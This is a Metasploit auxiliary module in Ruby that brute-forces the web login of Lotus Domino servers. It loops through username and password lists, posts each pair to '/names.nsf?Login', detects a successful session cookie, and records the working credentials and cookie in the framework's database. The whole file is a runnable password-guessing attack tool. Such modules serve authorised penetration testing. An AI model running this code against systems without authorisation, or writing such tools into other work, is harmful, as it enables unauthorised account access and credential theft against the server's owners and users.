##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name'           => 'Lotus Domino Brute Force Utility',
      'Description'    => 'Lotus Domino Authentication Brute Force Utility',
      'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
      'License'        =>  MSF_LICENSE
    )

  end

  def run_host(ip)

    each_user_pass { |user, pass|
      do_login(user, pass)
    }

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user=nil,pass=nil)
    post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
    vprint_status("http://#{vhost}:#{rport} - Lotus Domino - Trying username:'#{user}' with password:'#{pass}'")

    begin

      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => '/names.nsf?Login',
        'data'    => post_data,
      }, 20)

      if res and res.code == 302
        if res.get_cookies.match(/DomAuthSessId=(.*);(.*)/i)
          print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL login for '#{user}' : '#{pass}'")
          report_cred(
            ip: rhost,
            port: rport,
            service_name: (ssl ? "https" : "http"),
            user: user,
            password: pass,
            proof: "WEBAPP=\"Lotus Domino\", VHOST=#{vhost}, COOKIE=#{res.get_cookies}"
          )
          return :next_user
        end

        print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response")
        return :abort

      elsif res.body.to_s =~ /names.nsf\?Login/
        vprint_error("http://#{vhost}:#{rport} - Lotus Domino - Failed to login as '#{user}'")
        return
      else
        print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response") if res
        return :abort
      end

      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
